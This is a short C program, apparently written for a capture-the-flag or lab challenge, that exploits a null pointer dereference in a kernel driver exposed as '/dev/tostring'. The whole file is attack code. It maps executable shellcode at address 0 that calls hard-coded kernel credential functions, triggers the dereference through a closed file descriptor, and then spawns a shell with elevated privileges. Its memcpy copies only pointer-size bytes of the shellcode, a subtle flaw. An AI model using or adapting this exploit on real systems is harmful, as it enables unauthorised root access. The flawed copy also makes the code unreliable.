#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>

int main(){
        // (commit_creds_t) getSym(( u_int8_t*)"commit_creds");
        // pwntools shellcode = asm("xor rdi, rdi; mov r10, 0xffffffff8107af00; call r10; mov rdi, rax; mov r10, 0xffffffff8107ab70; call r10; ret; ")
        unsigned char* sc = "\x48\x31\xff\x49\xc7\xc2\x00\xaf\x07\x81\x41\xff\xd2\x48\x89\xc7\x49\xc7\xc2\x70\xab\x07\x81\x41\xff\xd2\xc3";
        char* m = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
         // copy shellcode into the mmap'd memory
        memcpy(m, sc, sizeof(sc));
        printf("shellcode mapped at %p", m);
        // maps shellcode to address 0 for when null pointer is derefernced
        int fd2 = open("/dev/tostring", O_RDWR);
        int fd = open("/dev/tostring", O_RDWR);
        char buf[5];
        close(fd2);
          // trigger null pointer dereference
        read(fd, buf, 5);
        system("/bin/sh");
        return 0;
}
